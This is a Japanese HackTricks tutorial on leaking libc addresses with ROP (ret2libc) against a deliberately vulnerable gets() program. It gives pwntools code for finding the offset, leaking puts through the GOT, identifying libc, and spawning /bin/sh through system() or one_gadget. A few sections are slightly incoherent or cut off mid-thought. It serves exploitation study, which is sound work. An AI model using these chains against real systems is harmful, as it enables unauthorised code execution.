# ROPを使用してlibcアドレスをリークする

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>からAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する。
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## クイックリサーム

1. **オーバーフローのオフセット**を見つける
2. `POP_RDI` ガジェット、`PUTS_PLT`、`MAIN` ガジェットを**見つける**
3. 前述のガジェットを使用して、putsや他のlibc関数のメモリアドレスを**リーク**し、**libcバージョンを見つける**（[ダウンロード](https://libc.blukat.me)）
4. ライブラリを使用して、ROPを計算し、それを悪用する

## 他のチュートリアルと練習用のバイナリ

このチュートリアルでは、このチュートリアルで提案されたコード/バイナリを悪用します：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
他の便利なチュートリアル：[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)、[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## コード

ファイル名：`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBCアドレス漏洩テンプレート

エクスプロイトをダウンロードし、脆弱性のあるバイナリと同じディレクトリに配置し、スクリプトに必要なデータを提供します：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- オフセットの検索

テンプレートは、エクスプロイトを続行する前にオフセットが必要です。提供されている場合、必要なコードを実行してそれを見つけます（デフォルトでは `OFFSET = ""`）。
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**実行** `python template.py` とすると、プログラムがクラッシュした状態で **GDBコンソール** が開かれます。その **GDBコンソール** 内で `x/wx $rsp` を実行して、RIP を上書きするバイト列を取得します。最後に、**pythonコンソール**を使用して **オフセット** を取得します：
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1007).png>)

オフセット（この場合は40）を見つけた後は、その値を使ってテンプレート内のOFFSET変数を変更します。\
`OFFSET = "A" * 40`

別の方法は、GEFから `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` を使用することです。

## 2- ガジェットの検索

次に、バイナリ内のROPガジェットを見つける必要があります。これらのROPガジェットは、**使用されているlibcを見つけるためにputsを呼び出し、後で** **最終的なエクスプロイトを起動する**のに役立ちます。
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`を呼び出すためには、**puts関数**を呼び出す必要があります。\
`MAIN_PLT`は、**オーバーフローを再度**利用するために、1回のインタラクション後に**main関数**を再度呼び出すために必要です（無限の利用ラウンド）。 **各ROPの最後にプログラムを再度呼び出すために使用されます**。\
**POP\_RDI**は、呼び出される関数に**パラメータ**を**渡す**ために必要です。

このステップでは、実行する必要はありません。すべては実行中にpwntoolsによって見つけられます。

## 3- libcライブラリの検索

今は、使用されている**libc**ライブラリのバージョンを見つける時です。そのために、**puts**関数のメモリ内の**アドレス**を**リーク**し、その後そのアドレスにあるputsバージョンがどの**ライブラリバージョン**にあるかを**検索**します。
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
それを行うために、実行されるコードの中で最も重要な行は次のとおりです：
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
これにより、**RIP** を**上書き**するまでのいくつかのバイトが送信されます: `OFFSET`。\
次に、ガジェット `POP_RDI` の**アドレス**が設定され、次のアドレス (`FUNC_GOT`) が**RDI** レジスタに保存されます。これは、`PUTS_GOT` の**アドレス**をメモリ内の puts 関数のアドレスが `PUTS_GOT` によって指し示されるアドレスとして**渡して puts を呼び出したい**ためです。\
その後、`PUTS_PLT` が呼び出されます（**RDI** に `PUTS_GOT` が含まれています）ので、puts は `PUTS_GOT` 内の**内容**（**メモリ内の puts 関数のアドレス**）を**読み取り**、それを**出力**します。\
最後に、**main 関数が再度呼び出され**、オーバーフローを再度悪用できます。

この方法で、puts 関数を**だまして**、**puts** 関数の**メモリ内のアドレス**（**libc** ライブラリ内にある）を**出力**させました。そのアドレスがわかったので、**使用されている libc のバージョンを調べる**ことができます。

![](<../../../../.gitbook/assets/image (1049).png>)

**ローカル**バイナリを**悪用**しているため、**使用されている libc のバージョンを特定する必要はありません**（単に `/lib/x86_64-linux-gnu/libc.so.6` でライブラリを見つければよい）。\
ただし、リモートエクスプロイトの場合は、次に説明する方法で見つけることができます:

### 3.1- libc バージョンの検索（1）

Web ページ [https://libc.blukat.me/](https://libc.blukat.me) で使用されているライブラリを検索できます。\
また、**libc** の発見されたバージョンをダウンロードすることもできます

![](<../../../../.gitbook/assets/image (221).png>)

### 3.2- libc バージョンの検索（2）

次のようにすることもできます:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

これには時間がかかるので、お待ちください。\
これを機能させるためには、次のものが必要です:

* Libc シンボル名: `puts`
* リークした libc アドレス: `0x7ff629878690`

最も可能性の高い**libc**がどれかを特定できます。
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
次の2つのマッチを取得します（最初のものが機能しない場合は、2番目のものを試してください）。最初のものをダウンロードしてください：
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
### 3.3- リークするための他の関数

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` から libc を作業ディレクトリにコピーします。
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libcアドレスの特定と悪用

この時点で、使用されているlibcライブラリを知っている必要があります。ローカルバイナリを悪用しているので、単に次のようにします:`/lib/x86_64-linux-gnu/libc.so.6`

したがって、`template.py`の冒頭で、**libc**変数を次のように変更します：`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libcライブラリ**への**パス**を指定すると、**残りの悪用が自動的に計算**されます。

`get_addr`関数の中で、**libcのベースアドレス**が計算されます：
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**最終的なlibcベースアドレスは00で終わる必要がある**ことに注意してください。そうでない場合、間違ったライブラリが漏洩している可能性があります。
{% endhint %}

次に、`system`関数へのアドレスと文字列_"/bin/sh"_への**アドレス**は、**libc**の**ベースアドレス**から**計算**され、**与えられたlibcライブラリ**になります。
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
最後に、/bin/sh実行エクスプロイトが準備され送信される予定です:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
## 最終のROPを説明しましょう。\
最後のROP (`rop1`) は再びmain関数を呼び出して終了しましたので、**オーバーフロー**を再度利用できます（そのために`OFFSET`が再度ここにあります）。その後、`POP_RDI`を呼び出して _"/bin/sh"_ のアドレス (`BINSH`) を指し、**system** 関数 (`SYSTEM`) を呼び出します。なぜなら _"/bin/sh"_ のアドレスがパラメータとして渡されるからです。\
最後に、**exit関数のアドレス**が呼び出されるので、プロセスが**きちんと終了**し、アラートが生成されません。

**この方法で、エクスプロイトは \_/bin/sh**\_\*\* シェルを実行します。\*\*

![](<../../../../.gitbook/assets/image (165).png>)

## 4(2)- ONE\_GADGETの使用

[**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)を使用して、**system** と **"/bin/sh"** を使用する代わりにシェルを取得することもできます。**ONE\_GADGET** は、libcライブラリ内で1つの **ROPアドレス**だけを使用してシェルを取得する方法を見つけます。\
ただし、通常、いくつかの制約があります。最も一般的で回避しやすいものは、`[rsp+0x30] == NULL` のようなものです。**RSP**内の値を制御できるため、さらにいくつかのNULL値を送信して制約を回避すればよいです。

![](<../../../../.gitbook/assets/image (754).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

この脆弱性を悪用するためのテンプレートはこちらにあります:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Common problems

### MAIN\_PLT = elf.symbols\['main'] が見つかりません

"main" シンボルが存在しない場合は、mainコードがどこにあるかを見つけることができます:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
そしてアドレスを手動で設定します：
```python
MAIN_PLT = 0x401080
```
### Putsが見つかりません

バイナリがPutsを使用していない場合は、次のように使用しているかどうかを確認する必要があります

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

この**エラー**を見つけた場合は、すべてのエクスプロイトを作成した後に `sh: 1: %s%s%s%s%s%s%s%s: not found`

**"/bin/sh"のアドレスから64バイトを引いてみてください**。
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
